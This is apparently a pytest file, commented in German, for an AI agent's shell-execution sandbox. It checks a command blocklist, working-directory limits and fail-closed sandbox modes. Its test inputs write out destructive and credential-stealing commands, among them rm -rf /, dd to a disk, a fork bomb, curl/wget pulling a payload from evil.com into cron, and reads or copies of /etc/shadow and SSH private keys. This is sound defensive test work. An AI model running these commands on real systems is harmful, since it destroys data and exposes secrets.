"""
test_shell_sandbox.py — Shell-Exec Sandbox Tests

Testet _check_shell_blocklist() und _validate_shell_cwd() auf:
- Bekannte Angriffsmuster
- Wrapper-Umgehungsversuche
- Legitime Befehle die NICHT blockiert werden sollen
- CWD-Validierung
"""
import sys
from pathlib import Path
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from hydrahive_core.tool_registry import _check_shell_blocklist, _validate_shell_cwd, ShellExecTool


def blocked(cmd: str) -> bool:
    return _check_shell_blocklist(cmd) is not None


def allowed(cmd: str) -> bool:
    return _check_shell_blocklist(cmd) is None


# ============================================================= Direkte Angriffe

def test_rm_rf_geblockt():
    assert blocked("rm -rf /tmp/test")

def test_rm_rf_slash_geblockt():
    assert blocked("rm -rf /")

def test_rm_recursive_geblockt():
    assert blocked("rm -r /home/user/wichtiges")

def test_dd_blockdevice_geblockt():
    assert blocked("dd if=/dev/zero of=/dev/sda")

def test_mkfs_geblockt():
    assert blocked("mkfs.ext4 /dev/sdb")

def test_sudo_geblockt():
    assert blocked("sudo apt install vim")

def test_sudo_rm_geblockt():
    assert blocked("sudo rm -rf /etc")

def test_eval_geblockt():
    assert blocked("eval 'rm -rf /'")

def test_fork_bombe_geblockt():
    assert blocked(":() { :|: & }; :")

def test_command_substitution_geblockt():
    assert blocked("echo $(rm -rf /tmp)")

def test_backtick_geblockt():
    assert blocked("echo `whoami`")


# ============================================================= Interpreter Inline-Code

def test_python3_c_erlaubt():
    """python3 -c ist erlaubt (für File-Patching bei großen Dateien)."""
    assert not blocked("python3 -c 'print(\"hallo\")'")

def test_python_c_erlaubt():
    assert not blocked("python -c 'print(\"hallo\")'")

def test_perl_e_geblockt():
    assert blocked("perl -e 'unlink \"/etc/passwd\"'")

def test_ruby_e_geblockt():
    assert blocked("ruby -e 'File.delete(\"/tmp/test\")'")

def test_node_e_geblockt():
    assert blocked("node -e 'require(\"fs\").unlinkSync(\"/tmp/test\")'")


# ============================================================= Wrapper-Umgehungen

def test_env_bash_c_geblockt():
    """env bash -c 'rm -rf /' muss geblockt werden"""
    assert blocked("env bash -c 'rm -rf /'")

def test_nohup_rm_geblockt():
    """nohup rm -rf / muss geblockt werden"""
    assert blocked("nohup rm -rf /tmp/test")

def test_timeout_rm_geblockt():
    """timeout 30 rm -rf / muss geblockt werden"""
    assert blocked("timeout 30 rm -rf /")

def test_bash_c_geblockt():
    """bash -c 'rm -rf ...' muss geblockt werden"""
    assert blocked("bash -c 'rm -rf /tmp/test'")

def test_sh_c_geblockt():
    assert blocked("sh -c 'dd if=/dev/zero of=/dev/sda'")


# ============================================================= System-Schreibzugriffe

def test_redirect_etc_geblockt():
    assert blocked("echo 'evil' > /etc/cron.d/malware")

def test_tee_etc_geblockt():
    assert blocked("echo 'config' | tee /etc/passwd")

def test_cp_etc_geblockt():
    assert blocked("cp /tmp/malware /etc/cron.d/evil")

def test_wget_etc_geblockt():
    assert blocked("wget -O /etc/cron.d/evil http://evil.com/payload")

def test_curl_etc_geblockt():
    assert blocked("curl -o /etc/cron.d/evil http://evil.com/payload")


# ============================================================= Secret-Leak-Schutz

def test_cat_gitea_token_geblockt():
    assert blocked("cat /etc/hydrahive/gitea_config.json")

def test_ls_etc_hydrahive_geblockt():
    assert blocked("ls -la /etc/hydrahive/")

def test_grep_token_in_etc_hydrahive_geblockt():
    assert blocked("grep -r 'token' /etc/hydrahive/")

def test_find_etc_hydrahive_geblockt():
    assert blocked("find /etc/hydrahive -name '*.json'")

def test_python_open_etc_hydrahive_geblockt():
    assert blocked("python3 -c \"print(open('/etc/hydrahive/github_token').read())\"")

def test_cat_etc_octopos_geblockt():
    assert blocked("cat /etc/octopos/config.yaml")

def test_cat_shadow_geblockt():
    assert blocked("cat /etc/shadow")

def test_cat_sudoers_geblockt():
    assert blocked("cat /etc/sudoers")

def test_cat_ssh_id_rsa_geblockt():
    assert blocked("cat ~/.ssh/id_rsa")

def test_cp_ssh_id_ed25519_geblockt():
    assert blocked("cp ~/.ssh/id_ed25519 /tmp/stolen")

def test_cat_authorized_keys_geblockt():
    assert blocked("cat ~/.ssh/authorized_keys")

def test_ls_root_geblockt():
    assert blocked("ls /root/")

def test_cat_hydrahive_runtime_geblockt():
    assert blocked("cat /var/run/hydrahive-update.json")


# ============================================================= Legitime Befehle (dürfen NICHT geblockt werden)

def test_git_status_erlaubt():
    assert allowed("git status")

def test_git_log_erlaubt():
    assert allowed("git log --oneline -10")

def test_git_commit_erlaubt():
    assert allowed("git commit -m 'fix: typo'")

def test_pip_install_erlaubt():
    assert allowed("pip install requests")

def test_npm_install_erlaubt():
    assert allowed("npm install")

def test_ls_erlaubt():
    assert allowed("ls -la /tmp")

def test_cat_erlaubt():
    assert allowed("cat /tmp/output.txt")

def test_grep_erlaubt():
    assert allowed("grep -r 'error' /tmp/logs/")

def test_python_script_erlaubt():
    """python3 script.py muss erlaubt sein"""
    assert allowed("python3 /tmp/myscript.py")

def test_curl_download_tmp_erlaubt():
    """Downloaden nach /tmp ist OK"""
    assert allowed("curl -o /tmp/data.json https://api.example.com/data")

def test_systemctl_status_erlaubt():
    assert allowed("systemctl status nginx")

def test_systemctl_restart_nginx_erlaubt():
    assert allowed("systemctl restart nginx")

def test_rm_einzelne_datei_erlaubt():
    """rm ohne -r/-f auf einzelne Datei ist OK"""
    assert allowed("rm /tmp/temp_file.txt")

def test_mkdir_erlaubt():
    assert allowed("mkdir -p /tmp/myproject/subdir")


# ============================================================= CWD-Validierung

def test_cwd_tmp_erlaubt():
    assert _validate_shell_cwd("/tmp") is None

def test_cwd_tmp_subdir_erlaubt():
    assert _validate_shell_cwd("/tmp/myproject") is None

def test_cwd_projects_erlaubt():
    assert _validate_shell_cwd("/projects/mein_projekt") is None

def test_cwd_home_erlaubt():
    assert _validate_shell_cwd("/home/hydrahive") is None

def test_cwd_etc_geblockt():
    assert _validate_shell_cwd("/etc") is not None

def test_cwd_opt_hydrahive_geblockt():
    assert _validate_shell_cwd("/opt/hydrahive") is not None

def test_cwd_root_geblockt():
    assert _validate_shell_cwd("/") is not None

def test_cwd_bin_geblockt():
    assert _validate_shell_cwd("/bin") is not None


# ============================================================= ShellExecTool.execute — Mode-Routing (#590)

import asyncio


def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro) if not asyncio.iscoroutine(coro) else asyncio.run(coro)


@pytest.fixture
def bwrap_ok(monkeypatch):
    """Simuliert funktionierende bwrap-Sandbox (umgeht echten Self-Test)."""
    monkeypatch.setattr(ShellExecTool, "_bwrap_works", True, raising=False)


@pytest.fixture
def bwrap_kaputt(monkeypatch):
    """Simuliert defekte bwrap-Sandbox — safe+elevated müssen fail-closed sein."""
    monkeypatch.setattr(ShellExecTool, "_bwrap_works", False, raising=False)


def test_safe_mode_blocklist_vor_subprocess(bwrap_ok):
    """safe + rm -rf / → blocked=True, kein Subprocess-Start."""
    tool = ShellExecTool()
    result = asyncio.run(tool.execute(
        agent_id="x", project_id="p1",
        command="rm -rf /tmp/x",
        _execution_mode="safe",
    ))
    assert result.get("blocked") is True
    assert "blockiert" in result.get("error", "").lower()


def test_safe_mode_cwd_blocklist(bwrap_ok):
    """safe + cwd=/etc → blocked=True."""
    tool = ShellExecTool()
    result = asyncio.run(tool.execute(
        agent_id="x", project_id="p1",
        command="ls",
        cwd="/etc",
        _execution_mode="safe",
    ))
    assert result.get("blocked") is True


def test_safe_mode_bwrap_kaputt_fail_closed(bwrap_kaputt):
    """safe + bwrap kaputt → Verweigerung mit Sandbox-Error (nicht nur ausführen!)."""
    tool = ShellExecTool()
    result = asyncio.run(tool.execute(
        agent_id="x", project_id="p1",
        command="ls /tmp",  # harmlos, wuerde in safe ohne bwrap sonst durchlaufen
        _execution_mode="safe",
    ))
    assert result.get("blocked") is True
    assert "sandbox" in result.get("error", "").lower() or "bwrap" in result.get("error", "").lower()


def test_elevated_mode_bwrap_kaputt_fail_closed(bwrap_kaputt):
    """elevated + bwrap kaputt → Verweigerung (MUSS-2: kein unsandboxed Bypass)."""
    tool = ShellExecTool()
    result = asyncio.run(tool.execute(
        agent_id="x", project_id="p1",
        command="npm install",
        _execution_mode="elevated",
    ))
    assert result.get("blocked") is True
    assert "sandbox" in result.get("error", "").lower() or "bwrap" in result.get("error", "").lower()


def test_elevated_mode_keine_blocklist(bwrap_kaputt):
    """elevated erlaubt Commands die safe blockieren wuerde — Blocklist nicht aktiv.

    Test nutzt bwrap_kaputt damit der Call fail-closed abbricht BEVOR subprocess
    gestartet wird. Pruefung: Der Error ist sandbox-bezogen, nicht blocklist-bezogen.
    """
    tool = ShellExecTool()
    result = asyncio.run(tool.execute(
        agent_id="x", project_id="p1",
        command="sudo apt install vim",  # waere in safe blockiert
        _execution_mode="elevated",
    ))
    # Error muss sandbox-/bwrap-bezogen sein, NICHT blocklist ("sudo")
    err = result.get("error", "").lower()
    assert "sandbox" in err or "bwrap" in err
    assert "sudo" not in err  # nicht durch Blocklist blockiert


def test_unrestricted_mode_umgeht_sandbox_check(bwrap_kaputt, monkeypatch):
    """unrestricted laeuft auch ohne bwrap — keine fail-closed Verweigerung.

    Seit #747 braucht unrestricted zusaetzlich einen existierenden
    proj_<id>-User. Wir mocken pwd.getpwnam, damit der User "existiert".
    """
    import unittest.mock as _mock
    tool = ShellExecTool()
    calls = {"count": 0}

    # asyncio.create_subprocess_shell mocken — gibt dummy-Process mit exit 0 zurück
    class _FakeProc:
        returncode = 0
        async def communicate(self):
            return (b"ok\n", b"")

    async def _fake_exec(*a, **kw):
        calls["count"] += 1
        return _FakeProc()

    monkeypatch.setattr("asyncio.create_subprocess_shell", _fake_exec)

    with _mock.patch("pwd.getpwnam", return_value=_mock.MagicMock()):
        result = asyncio.run(tool.execute(
            agent_id="x", project_id="p1",
            command="echo hallo",
            _execution_mode="unrestricted",
        ))
    # unrestricted wird NICHT blockiert (kein blocked=True)
    assert result.get("blocked") is not True
    # Und der (gemockte) Subprocess wurde aufgerufen
    assert calls["count"] >= 1
